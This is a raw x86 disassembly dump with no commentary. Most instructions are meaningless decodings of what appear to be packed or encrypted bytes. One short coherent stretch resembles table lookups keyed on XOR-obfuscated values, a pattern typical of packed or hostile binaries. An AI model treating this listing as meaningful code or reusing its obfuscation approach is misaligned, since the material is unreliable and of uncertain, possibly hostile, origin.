  41a738:	xlat   BYTE PTR ds:[ebx]
  41a739:	xor    cl,BYTE PTR [eax+0x52]
  41a73c:	mov    al,ds:0xfde06f7e
  41a741:	sbb    edi,edi
  41a743:	push   ss
  41a744:	cmp    ch,BYTE PTR [esi]
  41a746:	popa   
  41a747:	aaa    
  41a748:	xchg   ebx,eax
  41a749:	jb     0x41a791
  41a74b:	shl    bl,cl
  41a74d:	dec    ebx
  41a74e:	in     al,dx
  41a74f:	cs pop es
  41a751:	lds    esi,FWORD PTR [edx-0x4d8e39ec]
  41a757:	pop    ecx
  41a758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a759:	mov    al,0x18
  41a75b:	inc    esp
  41a75c:	add    al,0xc2
  41a75e:	or     BYTE PTR [eax],cl
  41a760:	sahf   
  41a761:	not    BYTE PTR [eax]
  41a763:	hlt    
  41a764:	call   0xa0f5a050
  41a769:	xchg   esp,eax
  41a76a:	ss jo  0x41a7ce
  41a76d:	push   ebp
  41a76e:	cdq    
  41a76f:	xchg   ecx,eax
  41a770:	and    DWORD PTR [ebx],eax
  41a772:	adc    eax,0xd4002993
  41a777:	mov    ebp,0x86443267
  41a77c:	cmp    ebx,eax
  41a77e:	xlat   BYTE PTR ds:[ebx]
  41a77f:	test   BYTE PTR [ebx],bh
  41a781:	xchg   esp,eax
  41a782:	add    ebp,DWORD PTR [eax+0x2315e4f3]
  41a788:	std    
  41a789:	imul   edx,ecx,0x70
  41a78c:	jmp    0x41a771
  41a78e:	xchg   ecx,eax
  41a78f:	test   al,0xa8
  41a791:	sub    al,0x36
  41a793:	pop    edi
  41a794:	dec    ecx
  41a795:	outs   dx,DWORD PTR ds:[esi]
  41a796:	mov    fs,ebp
  41a798:	daa    
  41a799:	and    eax,0x6f66a0eb
  41a79e:	mov    ds:0x7667fe69,eax
  41a7a3:	pop    ebx
  41a7a4:	fbld   TBYTE PTR [ebp-0x35f1b754]
  41a7aa:	pop    ss
  41a7ab:	mov    DWORD PTR [ecx+ecx*4+0x25886bbc],eax
  41a7b2:	jmp    0x7b2fe6d1
  41a7b7:	test   BYTE PTR [ebx],0x2f
  41a7ba:	dec    edx
  41a7bb:	push   edx
  41a7bc:	cmp    dl,dh
  41a7be:	fistp  WORD PTR [ecx+0xa]
  41a7c1:	sbb    al,0xd4
  41a7c3:	mov    ds:0xea987f57,eax
  41a7c8:	or     ch,BYTE PTR [eax+0x3119cc7e]
  41a7ce:	xchg   BYTE PTR [edi-0x5f],dl
  41a7d1:	(bad)  
  41a7d2:	arpl   WORD PTR [ebx],di
  41a7d4:	mov    cl,BYTE PTR [eax]
  41a7d6:	ins    BYTE PTR es:[edi],dx
  41a7d7:	mov    bh,0xa1
  41a7d9:	js     0x41a788
  41a7db:	outs   dx,DWORD PTR ds:[esi]
  41a7dc:	data16 adc al,0x9a
  41a7df:	mov    bh,0x4b
  41a7e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7e2:	test   eax,0x72f977ad
  41a7e7:	cmp    ebp,eax
  41a7e9:	sub    al,0x73
  41a7eb:	pusha  
  41a7ec:	(bad)  
  41a7ed:	cld    
  41a7ee:	and    al,0xac
  41a7f0:	stos   DWORD PTR es:[edi],eax
  41a7f1:	xchg   ecx,esi
  41a7f3:	lahf   
  41a7f4:	push   esi
  41a7f5:	or     BYTE PTR [edx+0x12],bh
  41a7f8:	ins    BYTE PTR es:[edi],dx
  41a7f9:	(bad)  
  41a7fa:	sub    BYTE PTR [edi+0x0],dh
  41a7fd:	les    edx,FWORD PTR [ebp+edi*1+0x46c9450b]
  41a804:	pop    edx
  41a805:	(bad)  
  41a806:	lds    edx,FWORD PTR [esi+0x62383209]
  41a80c:	push   0xb2d34d48
  41a811:	mov    eax,0x4508a3a5
  41a816:	ficom  WORD PTR [ebp+0x6c]
  41a819:	gs pushf 
  41a81b:	sub    DWORD PTR [edx-0x11],ebp
  41a81e:	inc    ebp
  41a81f:	imul   ecx,DWORD PTR [ecx+0x7d76227a],0x1d
  41a826:	imul   eax,DWORD PTR [edx],0xffffff95
  41a829:	mov    ebp,0x1fdb6840
  41a82e:	jbe    0x41a88c
  41a830:	xor    ebp,esi
  41a832:	je     0x41a7f1
  41a834:	ret    
  41a835:	add    al,BYTE PTR [esi]
  41a837:	xchg   DWORD PTR [ecx],esp
  41a839:	das    
  41a83a:	push   esp
  41a83b:	inc    edi
  41a83c:	push   ebp
  41a83d:	loopne 0x41a8b7
  41a83f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a840:	aam    0xfe
  41a842:	enter  0xb517,0x97
  41a846:	mov    bl,0xca
  41a848:	xchg   BYTE PTR [eax],bl
  41a84a:	xchg   ebx,eax
  41a84b:	repz xor BYTE PTR [esi+eiz*2],bh
  41a84f:	or     BYTE PTR [eax-0x6a],dh
  41a852:	mov    ds:0x3aa1f685,al
  41a857:	nop
  41a858:	cmp    DWORD PTR [edi],0x84fe7e6b
  41a85e:	test   ebx,esp
  41a860:	jne    0x41a7fc
  41a862:	jp     0x41a80a
  41a864:	adc    BYTE PTR [ebp-0x398fcfe5],0xe6
  41a86b:	or     ebx,DWORD PTR [edi+edi*8-0x5d20983]
  41a872:	inc    esi
  41a873:	popa   
  41a874:	xlat   BYTE PTR ds:[ebx]
  41a875:	out    0xaa,al
  41a877:	or     al,0xa
  41a879:	fs jle 0x41a807
  41a87c:	pop    edi
  41a87d:	inc    esp
  41a87e:	jb     0x41a866
  41a880:	outs   dx,DWORD PTR ds:[esi]
  41a881:	jecxz  0x41a87c
  41a883:	sahf   
  41a884:	mov    al,0x80
  41a886:	mov    ebp,0xe52751b0
  41a88b:	add    BYTE PTR [ecx+edi*1],0xe6
  41a88f:	ror    BYTE PTR [edx-0x3fa4daf5],cl
  41a895:	mov    dh,0x9a
  41a897:	or     eax,0x26d62656
  41a89c:	shr    DWORD PTR [ebx+0x1e3d41de],1
  41a8a2:	pop    esi
  41a8a3:	ins    DWORD PTR es:[edi],dx
  41a8a4:	fs stc 
  41a8a6:	push   cs
  41a8a7:	lock mov WORD PTR [edx],ss
  41a8aa:	lods   al,BYTE PTR ds:[esi]
  41a8ab:	pop    edi
  41a8ac:	mov    ebp,0x3d4ae1cb
  41a8b1:	es add eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sub    edi,0xfffffff6
  41a917:	push   ebx
  41a918:	cmovs  edx,ebp
  41a91b:	jg     0x41a995
  41a91d:	adc    BYTE PTR [esi+0x78],bh
  41a920:	js     0x41a96d
  41a922:	mov    ds:0x136d4370,al
  41a927:	sbb    eax,DWORD PTR [ecx]
  41a929:	(bad)  
  41a92a:	fadd   QWORD PTR [eax-0x4f]
  41a92d:	mov    ch,0x69
  41a92f:	mov    bh,0x9c
  41a931:	ds push ecx
  41a933:	sbb    BYTE PTR [esi+0x63],ch
  41a936:	stc    
  41a937:	mov    ebx,0xf7f84bf8
  41a93c:	clc    
  41a93d:	mov    ebx,0x6572d704
  41a942:	xor    eax,0x5df10d52
  41a947:	lea    ebp,[ecx]
  41a949:	int3   
  41a94a:	addr16 popf 
  41a94c:	jcxz   0x41a944
  41a94f:	inc    eax
  41a950:	cld    
  41a951:	repnz pusha 
  41a953:	ret    
  41a954:	inc    ebp
  41a955:	ret    0xda3e
  41a958:	jge    0x41a8de
  41a95a:	in     al,0x10
  41a95c:	xchg   edi,eax
  41a95d:	jb     0x41a954
  41a95f:	or     DWORD PTR [ebx],esi
  41a961:	or     ecx,DWORD PTR ds:0x2bb315d8
  41a967:	std    
  41a968:	and    DWORD PTR [ebx],0xd
  41a96b:	js     0x41a949
  41a96d:	pop    es
  41a96e:	cld    
  41a96f:	cmp    ecx,DWORD PTR [ecx-0x1de7bea3]
  41a975:	clc    
  41a976:	jle    0x41a9b0
  41a978:	cmc    
  41a979:	shl    BYTE PTR [ebp+0x3b0bfeae],0xc2
  41a980:	add    bh,BYTE PTR [eax+0x42]
  41a983:	arpl   WORD PTR [edi+0x56],dx
  41a986:	mov    bl,0xbe
  41a988:	scas   al,BYTE PTR es:[edi]
  41a989:	enter  0xc402,0x72
  41a98d:	stc    
  41a98e:	stos   BYTE PTR es:[edi],al
  41a98f:	jecxz  0x41aa04
  41a991:	ins    DWORD PTR es:[edi],dx
  41a992:	hlt    
  41a993:	shl    DWORD PTR [edi-0x3b44038c],0xb0
  41a99a:	push   esi
  41a99b:	loopne 0x41a990
  41a99d:	xor    BYTE PTR [ebp-0x7c9d29f8],dl
  41a9a3:	popf   
  41a9a4:	sbb    BYTE PTR ds:0xc02601f6,al
  41a9aa:	sub    BYTE PTR [esi],ah
  41a9ac:	mov    ds:0x4ea16043,al
  41a9b1:	stos   DWORD PTR es:[edi],eax
  41a9b2:	add    DWORD PTR [ecx+0x2b],eax
  41a9b5:	jle    0x41a950
  41a9b7:	add    DWORD PTR [ebx],esp
  41a9b9:	cwde   
  41a9ba:	mov    esi,0x2066465d
  41a9bf:	push   es
  41a9c0:	rol    BYTE PTR [ebp+0x70],1
  41a9c3:	jnp    0x41a9a5
  41a9c5:	sub    BYTE PTR [edx-0x5798f52e],0xe6
  41a9cc:	dec    edi
  41a9cd:	cmp    al,0x88
  41a9cf:	xlat   BYTE PTR ds:[ebx]
  41a9d0:	jg     0x41a9cb
  41a9d2:	mov    cl,0x90
  41a9d4:	mov    dh,0xef
  41a9d6:	jb     0x41a993
  41a9d8:	mov    al,ds:0x77edde7e
  41a9dd:	dec    esi
  41a9de:	ret    
  41a9df:	adc    DWORD PTR [eax-0x35],0x1
  41a9e3:	iret   
  41a9e4:	ret    0xefc6
  41a9e7:	inc    edx
  41a9e8:	cld    
  41a9e9:	out    dx,eax
  41a9ea:	xchg   esp,eax
  41a9eb:	cld    
  41a9ec:	dec    ebp
  41a9ed:	dec    ecx
  41a9ee:	mov    bl,0x46
  41a9f0:	or     ebp,DWORD PTR [eax]
  41a9f2:	inc    edi
  41a9f3:	cli    
  41a9f4:	jns    0x41a99d
  41a9f6:	int3   
  41a9f7:	xor    DWORD PTR [ebx],eax
  41a9f9:	test   DWORD PTR [ecx],ecx
  41a9fb:	test   al,0x91
  41a9fd:	jbe    0x41a9d6
  41a9ff:	nop
  41aa00:	mov    WORD PTR [eax-0x4984aca5],?
  41aa06:	add    eax,0xeb62524c
  41aa0b:	push   ds
  41aa0c:	dec    esi
  41aa0d:	jbe    0x41a9a5
  41aa0f:	mov    bl,0xe3
  41aa11:	hlt    
  41aa12:	sbb    eax,0x51560e4a
  41aa17:	sti    
  41aa18:	test   al,0x96
  41aa1a:	adc    DWORD PTR [edi+0x15],edx
  41aa1d:	push   cs
  41aa1e:	push   esi
  41aa1f:	mov    ecx,DWORD PTR [edi+0x10055fda]
  41aa25:	mov    al,0x16
  41aa27:	int3   
  41aa28:	sub    eax,0xc6956b35
  41aa2d:	mov    bh,BYTE PTR [eax]
  41aa2f:	addr16 pop ebx
  41aa31:	cmc    
  41aa32:	fidivr WORD PTR [ebp-0x35c74644]
  41aa38:	jne    0x41aa83
  41aa3a:	in     eax,dx
  41aa3b:	in     eax,0xcd
  41aa3d:	aam    0x5f
  41aa3f:	sar    DWORD PTR [edx],1
  41aa41:	(bad)  
  41aa42:	cmp    bh,BYTE PTR [edi+0x376a3f8]
  41aa48:	popa   
  41aa49:	popf   
  41aa4a:	jmp    0x41aa04
  41aa4c:	(bad)  
  41aa4d:	mov    esi,0xd337c093
  41aa52:	push   esp
  41aa53:	fdiv   DWORD PTR [eax-0x31d45a11]
  41aa59:	add    al,0xa2
  41aa5b:	push   ds
  41aa5c:	in     eax,dx
  41aa5d:	out    dx,al
  41aa5e:	cs mov cl,0x6
  41aa61:	or     BYTE PTR [ebx+ebx*1+0x57],0x51
  41aa66:	out    dx,eax
  41aa67:	mov    al,ds:0x93ab05c2
  41aa6c:	push   ds
  41aa6d:	jo     0x41aa40
  41aa6f:	jmp    0x275ddd7a
  41aa74:	mov    BYTE PTR [eax-0x65],al
  41aa77:	outs   dx,DWORD PTR ds:[esi]
  41aa78:	inc    eax
  41aa79:	mov    edx,0x8f9b2f24
  41aa7e:	jno    0x41aadf
  41aa80:	jae    0x41aa46
  41aa82:	jo     0x41aa5e
  41aa84:	jle    0x41aab2
  41aa86:	or     ebx,DWORD PTR [edx]
  41aa88:	mov    esp,0xe9359292
  41aa8d:	mov    ds:0x193c9731,eax
  41aa92:	popa   
  41aa93:	cmp    ah,BYTE PTR [edi]
  41aa95:	mov    al,ds:0xc7859c72
  41aa9a:	dec    eax
  41aa9b:	ins    DWORD PTR es:[edi],dx
  41aa9c:	addr16 out 0x88,eax
  41aa9f:	mov    edx,0xbfcf4fc0
  41aaa4:	pop    edx
  41aaa5:	sbb    DWORD PTR [esi],0xffffff9f
  41aaa8:	dec    ebx
  41aaa9:	push   cs
  41aaaa:	sub    al,BYTE PTR [edx+0x11c7b581]
  41aab0:	dec    ebp
  41aab1:	xor    cl,dh
  41aab3:	lock xchg DWORD PTR [esi+0x3b],eax
  41aab7:	mov    ecx,0x1028a699
  41aabc:	cmp    edx,DWORD PTR [ecx-0x4b]
  41aabf:	addr16 dec esi
  41aac1:	xor    DWORD PTR [eax],edi
  41aac3:	fdiv   st(0),st
  41aac5:	push   ecx
  41aac6:	scas   eax,DWORD PTR es:[edi]
  41aac7:	std    
  41aac8:	shl    BYTE PTR [ebp-0x72],1
  41aacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aacc:	sbb    DWORD PTR [edx],edx
  41aace:	inc    ebx
  41aacf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aad0:	mov    edx,0x3c4ac09c
  41aad5:	pop    es
  41aad6:	sysret 
  41aad8:	jns    0x41ab0d
  41aada:	mov    eax,0x7b3cc3b9
  41aadf:	xchg   BYTE PTR [edx-0x5e1af49c],cl
  41aae5:	adc    eax,0x47f13ed8
  41aaea:	ret    0xecd
  41aaed:	daa    
  41aaee:	add    ch,BYTE PTR [ebp+0x120abc5f]
  41aaf4:	bound  esi,QWORD PTR [ecx]
  41aaf6:	(bad)
  41aaf9:	out    dx,eax
  41aafa:	and    BYTE PTR [edx],0x93
  41aafd:	mov    ebp,DWORD PTR [eax-0x78a02535]
  41ab03:	fiadd  DWORD PTR [eax+0x3c]
  41ab06:	cli    
  41ab07:	pop    edx
  41ab08:	lea    ebx,[edx-0x53]
  41ab0b:	fisubr WORD PTR [ebx-0x4]
  41ab0e:	in     eax,0xfc
  41ab10:	pop    es
  41ab11:	in     eax,0xef
  41ab13:	xchg   edi,eax
  41ab14:	pushf  
  41ab15:	and    al,0xbb
  41ab17:	sar    BYTE PTR [edi-0x31],cl
  41ab1a:	inc    ecx
  41ab1b:	pop    ebx
  41ab1c:	fild   DWORD PTR [ebx+0x56]
  41ab1f:	adc    dl,BYTE PTR [ebx]
  41ab21:	mov    ?,esp
  41ab23:	mov    DWORD PTR [ebx+0x973902e],edi
  41ab29:	scas   ax,WORD PTR es:[edi]
  41ab2b:	sub    bl,bh
  41ab2d:	push   cs
  41ab2e:	fdivrp st(0),st
  41ab30:	call   0xa2c1:0xbecddb36
  41ab37:	sbb    DWORD PTR [eax+0x49056a59],ebx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x6caff8be
  41ab52:	and    eax,0x787fdb60
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41aae8
  41ab5c:	push   esi
  41ab5d:	inc    esi
  41ab5e:	push   edi
  41ab5f:	call   0x79dfb678
  41ab64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab65:	xchg   edx,eax
  41ab66:	or     al,0xef
  41ab68:	push   ds
  41ab69:	fild   DWORD PTR [edx+0x7005fde0]
  41ab6f:	add    ch,BYTE PTR [eax+0x70]
  41ab72:	mov    ah,0x44
  41ab74:	push   esi
  41ab75:	sbb    eax,0xbe563e84
  41ab7a:	add    al,BYTE PTR [edi]
  41ab7c:	sahf   
  41ab7d:	pop    ss
  41ab7e:	ss or  eax,0xc0569914
  41ab84:	mov    bl,BYTE PTR [ecx]
  41ab86:	int3   
  41ab87:	jecxz  0x41ab36
  41ab89:	imul   esi,DWORD PTR [edi-0x41],0x4122fca4
  41ab90:	xchg   DWORD PTR [edx+edx*8+0x32],esi
  41ab94:	and    cl,bl
  41ab96:	and    DWORD PTR [edx],eax
  41ab98:	cmp    al,0x3f
  41ab9a:	sub    BYTE PTR [edi],ah
  41ab9c:	jno    0x41ab33
  41ab9e:	retf   
  41ab9f:	in     al,0x86
  41aba1:	arpl   WORD PTR [ecx],dx
  41aba3:	(bad)  
  41aba4:	xchg   BYTE PTR [edi-0x2431d18e],dh
  41abaa:	(bad)  
  41abab:	int    0xe3
  41abad:	sahf   
  41abae:	mov    eax,edi
  41abb0:	(bad)  
  41abb1:	mov    ch,0x93
  41abb3:	mov    WORD PTR [edi-0x2d],ds
  41abb6:	fwait
  41abb7:	in     al,0xd6
  41abb9:	fs ds popf 
  41abbc:	in     eax,dx
  41abbd:	lods   eax,DWORD PTR ds:[esi]
  41abbe:	or     BYTE PTR [edi-0x696b6f4f],cl
  41abc4:	xlat   BYTE PTR ds:[ebx]
  41abc5:	test   eax,0x4cd8db26
  41abca:	dec    ebp
  41abcb:	push   ds
  41abcc:	xor    BYTE PTR [esp+ebp*1-0x30],ch
  41abd0:	fisubr WORD PTR [ecx]
  41abd2:	loopne 0x41ac19
  41abd4:	sbb    al,0x77
  41abd6:	or     bl,BYTE PTR [ebx+0x77d171e4]
  41abdc:	push   edx
  41abdd:	loop   0x41ac5a
  41abdf:	cmc    
  41abe0:	xor    eax,0xd9b82e28
  41abe5:	gs and edi,DWORD PTR gs:[ebp+edx*8-0x53ac96ea]
  41abee:	repz inc ecx
  41abf0:	test   ebp,ecx
  41abf2:	je     0x41abc0
  41abf4:	add    BYTE PTR [ecx-0x60],bl
  41abf7:	jbe    0x41abd6
  41abf9:	mov    bh,dl
  41abfb:	repz hlt 
  41abfd:	mov    dl,0xa5
  41abff:	and    al,0x5
  41ac01:	fldenv [edi-0xf]
  41ac04:	xchg   esp,eax
  41ac05:	inc    ecx
  41ac06:	and    eax,0x5d473d7b
  41ac0b:	xchg   ebx,eax
  41ac0c:	popf   
  41ac0d:	xor    edi,esi
  41ac0f:	xchg   BYTE PTR [edx+ecx*4],ah
  41ac12:	mov    BYTE PTR [edx+0x58],al
  41ac15:	shl    BYTE PTR [edi+eax*4-0x754d4a9a],cl
  41ac1c:	stos   BYTE PTR es:[edi],al
  41ac1d:	cli    
  41ac1e:	push   0xaef95b03
  41ac23:	cmp    eax,0x985fba12
  41ac28:	ins    DWORD PTR es:[edi],dx
  41ac29:	stc    
  41ac2a:	loop   0x41ac57
  41ac2c:	jb     0x41ac39
  41ac2e:	clc    
  41ac2f:	call   0x95b:0xabff70e8
  41ac36:	sbb    eax,0xfaaf7bc2
  41ac3b:	test   eax,0x4038ba2c
  41ac40:	sub    BYTE PTR ds:[edx-0x2038966c],ch
  41ac47:	dec    edx
  41ac48:	push   ecx
  41ac49:	xor    BYTE PTR [ebx],dh
  41ac4b:	push   cs
  41ac4c:	jo     0x41abeb
  41ac4e:	mov    eax,0xe0628c6b
  41ac53:	push   edx
  41ac54:	enter  0xd2c9,0x33
  41ac58:	cdq    
  41ac59:	out    0x23,eax
  41ac5b:	inc    esp
  41ac5c:	dec    eax
  41ac5d:	inc    ebx
  41ac5e:	mov    esp,ecx
  41ac60:	aad    0xba
  41ac62:	cmc    
  41ac63:	push   edx
  41ac64:	jle    0x41acba
  41ac66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac67:	out    0x22,eax
  41ac69:	test   BYTE PTR [eax+0x5b],ah
  41ac6c:	jmp    0x41ac68
  41ac6e:	ja     0x41ac8b
  41ac70:	fwait
  41ac71:	test   DWORD PTR ds:[ecx],esi
  41ac74:	outs   dx,DWORD PTR ds:[esi]
  41ac75:	jl     0x41acb5
  41ac77:	inc    ebp
  41ac78:	xchg   BYTE PTR [edi-0x3a],bl
  41ac7b:	jmp    0x4e2f194c
  41ac80:	push   edx
  41ac81:	lods   eax,DWORD PTR ds:[esi]
  41ac82:	and    al,0xc0
  41ac84:	test   eax,0xefe2a491
  41ac89:	out    dx,eax
  41ac8a:	push   ds
  41ac8b:	ss addr16 jbe 0x41acfa
  41ac8f:	les    ebx,FWORD PTR [eax]
  41ac91:	and    al,0xd0
  41ac93:	je     0x41ac2c
  41ac95:	inc    ecx
  41ac96:	fisub  WORD PTR [ebp-0x79810408]
  41ac9c:	mov    eax,0x26e0b6c4
  41aca1:	cs int 0x50
  41aca4:	std    
  41aca5:	fucom  st(5)
  41aca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aca8:	mov    WORD PTR [edx+0x64d753fe],?
  41acae:	xchg   edx,eax
  41acaf:	rol    DWORD PTR [eax],cl
  41acb1:	xor    DWORD PTR [edi],ecx
  41acb3:	dec    edi
  41acb4:	add    al,0x16
  41acb6:	out    0x22,eax
  41acb8:	push   edi
  41acb9:	rcl    BYTE PTR [edi],0x2
  41acbc:	jl     0x41ad13
  41acbe:	mov    ah,0x62
  41acc0:	sbb    dl,bl
  41acc2:	jmp    0x41acab
  41acc4:	sub    al,0x76
  41acc6:	inc    ebx
  41acc7:	jbe    0x41ad0b
  41acc9:	arpl   WORD PTR [ebx],bp
  41accb:	(bad)  
  41accc:	adc    ebx,ebp
  41acce:	sbb    al,0x54
  41acd0:	xchg   ebx,eax
  41acd1:	repnz push cs
  41acd3:	push   esp
  41acd4:	out    0x5a,eax
  41acd6:	add    eax,0x49d4a4c3
  41acdb:	xor    DWORD PTR [ebp+0x77175dca],esp
  41ace1:	sbb    ah,ah
  41ace3:	shr    BYTE PTR [ecx+0x6d83128f],0xb6
  41acea:	xor    eax,0x8977f265
  41acef:	sub    eax,0x438daaca
  41acf4:	rol    DWORD PTR ds:[ebx],1
  41acf7:	mov    ch,0x57
  41acf9:	pop    edx
  41acfa:	mov    bl,0x41
  41acfc:	push   0xffffffde
  41acfe:	cmp    eax,ebp
  41ad00:	dec    esi
  41ad01:	fnstcw WORD PTR [edx]
  41ad03:	dec    ebx
  41ad04:	(bad)  
  41ad06:	shr    BYTE PTR ds:0x5d754428,0x93
  41ad0d:	adc    esi,DWORD PTR [bx]
  41ad10:	lods   eax,DWORD PTR ds:[esi]
  41ad11:	cli    
  41ad12:	stos   BYTE PTR es:[edi],al
  41ad13:	mov    cl,0x4b
  41ad15:	cs add ebx,ebp
  41ad18:	das    
  41ad19:	add    eax,0xdc0dc780
  41ad1e:	pop    ecx
  41ad1f:	sbb    edx,ebp
  41ad21:	daa    
  41ad22:	push   0xffffffd2
  41ad24:	sbb    al,0xd2
  41ad26:	(bad)  
  41ad27:	icebp  
  41ad28:	fucomp st(2)
  41ad2a:	jnp    0x41acb1
  41ad2c:	push   ecx
  41ad2d:	and    eax,edx
  41ad2f:	jle    0x41ad58
  41ad31:	ss xchg dl,ch
  41ad34:	sbb    ecx,esi
  41ad36:	xchg   ecx,eax
  41ad37:	pop    ecx
  41ad38:	ins    BYTE PTR es:[edi],dx
  41ad39:	cmp    ebx,0x4826d68d
  41ad3f:	rcl    DWORD PTR [edx+0x3a],cl
  41ad42:	mov    ecx,DWORD PTR [ebp+edx*4+0x7f2ba932]
  41ad49:	in     al,dx
  41ad4a:	or     al,0x71
  41ad4c:	rcr    DWORD PTR ds:0xbd204830,0xb3
  41ad53:	idiv   BYTE PTR [edx-0x14]
  41ad56:	aas    
  41ad57:	cs push eax
  41ad59:	sbb    edx,DWORD PTR [ebp-0x3aae7f81]
  41ad5f:	aad    0x1c
  41ad61:	mov    DWORD PTR [eax+0x2],ebx
  41ad64:	or     BYTE PTR [edi],ch
  41ad66:	push   0xf85b7619
  41ad6b:	cmp    al,0x6a
  41ad6d:	mov    gs,WORD PTR [eax]
  41ad6f:	or     BYTE PTR [esp+ebx*1+0x2bcb8794],bl
  41ad76:	fldl2t 
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x9dd25295,eax
  41ad89:	stos   DWORD PTR es:[edi],eax
  41ad8a:	push   ebx
  41ad8b:	cmp    DWORD PTR [eax-0x28],edi
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adfa
  41ad95:	in     al,0xe3
  41ad97:	lods   al,BYTE PTR ds:[esi]
  41ad99:	mov    bl,0x93
  41ad9b:	dec    edx
  41ad9c:	xchg   edi,eax
  41ad9d:	push   eax
  41ad9e:	add    BYTE PTR [edi-0xe5c2664],dl
  41ada4:	inc    ebx
  41ada5:	fist   DWORD PTR [esi-0xe22331]
  41adab:	adc    DWORD PTR [edi],ebx
  41adad:	push   es
  41adae:	test   al,0x46
  41adb0:	mov    ebp,0x5bbfe8b6
  41adb5:	pop    ebp
  41adb6:	icebp  
  41adb7:	(bad)  
  41adb8:	cmp    DWORD PTR [edi],esi
  41adba:	ja     0x41ae02
  41adbc:	and    al,0xc0
  41adbe:	add    BYTE PTR [edi+ebx*2],bh
  41adc1:	fcmovnbe st,st(4)
  41adc3:	dec    ebp
  41adc4:	sbb    esi,esi
  41adc6:	push   edx
  41adc7:	(bad)  
  41adc8:	mov    DWORD PTR [edx],esi
  41adca:	inc    ecx
  41adcb:	sbb    DWORD PTR [ebx-0x70acc3a6],eax
  41add1:	aam    0x24
  41add3:	mov    esi,0x226f5e3d
  41add8:	or     al,0xdb
  41adda:	push   eax
  41addb:	sub    dl,BYTE PTR [edx]
  41addd:	adc    ah,dh
  41addf:	ds and eax,0xcadd1637
  41ade5:	retf   0xb4d
  41ade8:	hlt    
  41ade9:	not    BYTE PTR [ecx-0x73692c53]
  41adef:	xor    ah,ah
  41adf1:	aas    
  41adf2:	out    dx,eax
  41adf3:	mov    ds:0x3b1feefa,al
  41adf8:	mov    ah,0xd2
  41adfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adfb:	push   cs
  41adfc:	sbb    DWORD PTR [esi],esi
  41adfe:	in     al,dx
  41adff:	lea    esi,ds:0x4a21c3f
  41ae05:	icebp  
  41ae06:	mov    ch,0x68
  41ae08:	mov    bh,0xf6
  41ae0a:	popfw  
  41ae0c:	xchg   ebp,eax
  41ae0d:	jmp    0x41ae31
  41ae0f:	call   DWORD PTR [eax+0x5d]
  41ae12:	push   ds
  41ae13:	js     0x41ae0b
  41ae15:	adc    DWORD PTR ds:0x17dabb76,ebp
  41ae1b:	adc    dl,bl
  41ae1d:	ror    cl,1
  41ae1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae20:	idiv   DWORD PTR [eax+0xff2d1c3]
  41ae26:	ret    
  41ae27:	and    eax,0xd5a32ad5
  41ae2c:	cld    
  41ae2d:	cmp    esp,DWORD PTR [esi+0x1d]
  41ae30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae31:	rcr    DWORD PTR [ecx-0x20],0x7f
  41ae35:	push   ds
  41ae36:	lods   eax,DWORD PTR ds:[esi]
  41ae37:	(bad)  
  41ae38:	int    0x70
  41ae3a:	xchg   edx,eax
  41ae3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae3c:	cmp    al,0xac
  41ae3e:	fcmovnu st,st(3)
  41ae40:	mov    edx,0x693415d
  41ae45:	ds push edx
  41ae47:	xchg   edi,edi
  41ae49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae4a:	dec    esp
  41ae4b:	sub    al,0xa1
  41ae4d:	daa    
  41ae4e:	test   al,0xa2
  41ae50:	(bad)  
  41ae51:	xor    bl,BYTE PTR [ebx-0x5f41f7e9]
  41ae57:	xor    ebp,DWORD PTR [eax-0x29]
  41ae5a:	(bad)  
  41ae5b:	nop
  41ae5c:	ja     0x41ae94
  41ae5e:	dec    esi
  41ae5f:	and    bl,ah
  41ae61:	jbe    0x41ae5f
  41ae63:	xchg   edx,eax
